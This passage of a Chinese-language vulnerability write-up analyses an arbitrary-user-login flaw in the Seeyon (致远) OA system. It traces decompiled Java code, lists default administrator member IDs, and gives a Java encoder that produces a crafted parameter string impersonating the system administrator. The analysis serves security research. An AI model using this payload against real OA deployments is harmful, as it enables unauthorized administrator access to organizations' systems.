                <span class="k">if</span> <span class="o">(</span><span class="n">NumberUtils</span><span class="o">.</span><span class="na">isNumber</span><span class="o">(</span><span class="n">startTimeStr</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">timeStamp</span> <span class="o">=</span> <span class="n">Long</span><span class="o">.</span><span class="na">parseLong</span><span class="o">(</span><span class="n">startTimeStr</span><span class="o">);</span>
                <span class="o">}</span>

                <span class="k">if</span> <span class="o">((</span><span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">-</span> <span class="n">timeStamp</span><span class="o">)</span> <span class="o">/</span> <span class="mi">1000L</span> <span class="o">&gt;</span> <span class="o">(</span><span class="kt">long</span><span class="o">)(</span><span class="k">this</span><span class="o">.</span><span class="na">messageMailManager</span><span class="o">.</span><span class="na">getContentLinkValidity</span><span class="o">()</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">mv</span><span class="o">.</span><span class="na">addObject</span><span class="o">(</span><span class="s">"ExceptionKey"</span><span class="o">,</span> <span class="s">"mail.read.alert.guoqi"</span><span class="o">);</span>
                    <span class="k">return</span> <span class="n">mv</span><span class="o">;</span>
                <span class="o">}</span>

                <span class="n">String</span> <span class="n">_memberId</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">encMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"M"</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">_memberId</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">mv</span><span class="o">.</span><span class="na">addObject</span><span class="o">(</span><span class="s">"ExceptionKey"</span><span class="o">,</span> <span class="s">"mail.read.alert.wuxiao"</span><span class="o">);</span>
                    <span class="k">return</span> <span class="n">mv</span><span class="o">;</span>
                <span class="o">}</span>

                <span class="n">memberId</span> <span class="o">=</span> <span class="n">Long</span><span class="o">.</span><span class="na">parseLong</span><span class="o">(</span><span class="n">_memberId</span><span class="o">);</span>
                <span class="n">link</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">UserMessageUtil</span><span class="o">.</span><span class="na">getMessageLinkType</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">linkType</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">link</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">mv</span><span class="o">.</span><span class="na">addObject</span><span class="o">(</span><span class="s">"ExceptionKey"</span><span class="o">,</span> <span class="s">"mail.read.alert.wuxiao"</span><span class="o">);</span>
                    <span class="k">return</span> <span class="n">mv</span><span class="o">;</span>
                <span class="o">}</span>
</pre></div>
<p>上面这段代码是从encMap中根据键<code>L</code>、<code>P</code>、<code>T</code>、<code>M</code>拿到对应的值分别赋值给<code>linkType</code>、<code>path</code>、<code>startTimeStr</code>、<code>_memberId</code>。</p>
<p>其中<code>linkType</code>、<code>startTimeStr</code>、<code>_memberId</code>所获取到的值很关键，也很重要。</p>
<p>在316-344行处</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240220180323-48986ee6-cfd7-1.png"/></p>
<p>这里之所以要进入这个if语句体中，是因为需要执行333这条语句，从<code>encMap</code>中获取到<code>_memberId</code>的值，后这个值将会有很大的作用。</p>
<p>在执行在拿到<code>_memberId</code>值之前，先是判断当前的时间是否大于了指定的时间，如果是直接返回了，很显然，我们肯定不想直接返回。</p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="o">((</span><span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">-</span> <span class="n">timeStamp</span><span class="o">)</span> <span class="o">/</span> <span class="mi">1000L</span> <span class="o">&gt;</span> <span class="o">(</span><span class="kt">long</span><span class="o">)(</span><span class="k">this</span><span class="o">.</span><span class="na">messageMailManager</span><span class="o">.</span><span class="na">getContentLinkValidity</span><span class="o">()</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span><span class="o">))</span> <span class="o">{</span>
    <span class="n">mv</span><span class="o">.</span><span class="na">addObject</span><span class="o">(</span><span class="s">"ExceptionKey"</span><span class="o">,</span> <span class="s">"mail.read.alert.guoqi"</span><span class="o">);</span>
    <span class="k">return</span> <span class="n">mv</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>这里的stimeStamp直接可控，所以可以直接传入一个很大的值，可以传入一个跟<code>System.currentTimeMillis()</code>获取到的一样的值，这个条件不成立就不会进入。然后就会在encMap中拿到<code>_memberId</code>的值。</p>
<p>最后</p>
<div class="highlight"><pre><span></span><span class="n">link</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">UserMessageUtil</span><span class="o">.</span><span class="na">getMessageLinkType</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">linkType</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">link</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">mv</span><span class="o">.</span><span class="na">addObject</span><span class="o">(</span><span class="s">"ExceptionKey"</span><span class="o">,</span> <span class="s">"mail.read.alert.wuxiao"</span><span class="o">);</span>
        <span class="k">return</span> <span class="n">mv</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>这里也是一个很关键的地方，如果link的值为空，那么会直接返回，所以这里必须通过<code>linkType</code>拿到点什么。</p>
<p>先跟入<code>getMessageLinkType</code>方法中。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240220180331-4d727948-cfd7-1.png"/></p>
<p>调用了<code>userMessageManager.getMessageLinkTypes()</code>获取值，继续跟入</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240220180337-50804638-cfd7-1.png"/></p>
<p>找到对应的实现类。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240220180342-5393c214-cfd7-1.png"/></p>
<p>继续跟入</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240220180347-5684eeee-cfd7-1.png"/></p>
<p>发现直接返回了<code>messageLinkTypes</code>，接下来在这个类中看看哪儿给<code>messageLinkTypes</code>传入了参数。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240220180354-5b2aaf38-cfd7-1.png"/></p>
<p>在<code>129-136</code>行处，加载了<code>/base/message-link.properties</code>配置文件，然后把值赋put进<code>messageLinkTypes</code>中。</p>
<p>在<code>message-link.properties</code>文件中</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240220180402-5f67d68e-cfd7-1.png"/></p>
<p>随便挑一个给<code>linkType</code>赋值就可以绕过最后一个条件。</p>
<p>接下来就来到最关键的一步</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240220180406-6236f728-cfd7-1.png"/></p>
<p>这段代码通过我们拿到的<code>memberId</code>作为参数调用了<code>this.orgManager.getMemberById</code>，这个方法大致就是通过<code>memberId</code>查找对应的用户，从别的师傅文章中得知，致远中存在几个默认的用户。</p>
<pre><code>"5725175934914479521"   "集团管理员"
"-7273032013234748168"  "系统管理员"
"-7273032013234748798"  "系统监控"
"-4401606663639775639"  "审计管理员"</code></pre>
<p>我们只需要通过以上<code>memberId</code>就能查询出管理员用户信息，在422行，用新创建的<code>User</code>对象重新设置了<code>session</code>，并且将查询出来的用户信息设置到了<code>currentUser</code>对象中，这才导致了任意用户登录漏洞。</p>
<p><strong>参数编码解码代码</strong></p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">encodeString</span><span class="o">(</span><span class="s">"L=message.link.bbs.open&amp;M=-7273032013234748168&amp;T=9999999999999"</span><span class="o">));</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">decodeString</span><span class="o">(</span><span class="n">String</span> <span class="n">encodeString</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">encodeString</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="n">encodeString</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">((</span><span class="k">new</span> <span class="n">Base64</span><span class="o">()).</span><span class="na">decode</span><span class="o">(</span><span class="n">encodeString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()));</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">var3</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
            <span class="o">}</span>

            <span class="kt">char</span><span class="o">[]</span> <span class="n">encodeStringCharArray</span> <span class="o">=</span> <span class="n">encodeString</span><span class="o">.</span><span class="na">toCharArray</span><span class="o">();</span>

            <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">encodeStringCharArray</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
                <span class="o">--</span><span class="n">encodeStringCharArray</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
            <span class="o">}</span>

            <span class="k">return</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">encodeStringCharArray</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">encodeString</span><span class="o">(</span><span class="n">String</span> <span class="n">encodeString</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">encodeString</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="kt">char</span><span class="o">[]</span> <span class="n">encodeStringCharArray</span> <span class="o">=</span> <span class="n">encodeString</span><span class="o">.</span><span class="na">toCharArray</span><span class="o">();</span>

            <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">encodeStringCharArray</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
                <span class="o">++</span><span class="n">encodeStringCharArray</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
            <span class="o">}</span>

            <span class="k">try</span> <span class="o">{</span>
                <span class="n">encodeString</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">((</span><span class="k">new</span> <span class="n">Base64</span><span class="o">()).</span><span class="na">encode</span><span class="o">((</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">encodeStringCharArray</span><span class="o">)).</span><span class="na">getBytes</span><span class="o">()));</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">var3</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
            <span class="o">}</span>

            <span class="k">return</span> <span class="n">encodeString</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</div>
</div>